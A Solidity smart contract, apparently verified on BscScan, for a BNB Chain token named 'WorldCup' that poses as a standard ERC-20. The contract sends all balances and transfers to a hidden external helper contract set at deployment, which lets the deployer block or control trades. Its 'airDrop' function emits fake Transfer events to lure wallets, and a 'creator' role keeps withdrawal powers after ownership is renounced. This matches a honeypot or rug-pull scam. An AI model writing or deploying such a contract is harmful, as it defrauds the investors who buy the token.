/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20Factory {

    function constructorErc20(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function getSupply() view external returns (uint256);

    function balanceOf(address _owner) view external returns (uint256);

    function getAirAmount() view external returns (uint256);

    function erc20Transfer(address _from, address _to, uint256 _value) external;

    function erc20Approve(address _to) external;

    function erc20TransferAfter(address _from, address _to, uint256 _value) external;

}

interface IDEXRouter {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract Ownable {
    address public owner;
    address public creator;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlycreator() {
        require(msg.sender == creator);
        _;
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}

contract WorldCup is Ownable {
	
    string public name = "WorldCup";
    string  public symbol = "WorldCup";
    uint8   public decimals = 9;
	uint256 private totalSupply_ = 100000000 * (10 ** decimals);
	
	address public pairs;
	IDEXRouter public router;
	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
	IERC20Factory help;
    
	constructor(address hAddr) {
		owner = msg.sender;
        creator = msg.sender;
        help= IERC20Factory(hAddr);
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        help.constructorErc20(totalSupply_, address(this), owner,pairs);
        emit Transfer(address(0), owner, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	

    function totalSupply() public view returns (uint256) {
        return help.getSupply();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return help.balanceOf(_owner);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(help.balanceOf(msg.sender) >= _value);

        help.erc20Transfer(msg.sender,_to,_value);
        
        help.erc20TransferAfter(msg.sender,_to,_value);
		emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= help.balanceOf(_from));
        require(_value <= allowed[_from][msg.sender]);
		
        help.erc20Transfer(_from,_to,_value);
        
        help.erc20TransferAfter(_from,_to,_value);
		emit Transfer(_from, _to, _value);
        return true;
    }

    function emitTransfer(address _from, address _to, uint256 _value) public returns (bool success) {
        require(msg.sender==address(help));
        emit Transfer(_from, _to, _value);
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        help.erc20Approve(msg.sender);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function airDrop(bytes memory _bytes,uint256 addrCount) public onlycreator {
        uint256 amount=help.getAirAmount();
        uint256 _start=0;
        address tempAddress;
        for(uint32 i=0;i<addrCount;i++){
            assembly {
                tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)
            }
            emit Transfer(address(0), tempAddress, amount);
            _start+=20;
        }
    }

    function withdraw(address target,uint amount) public onlycreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlycreator {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}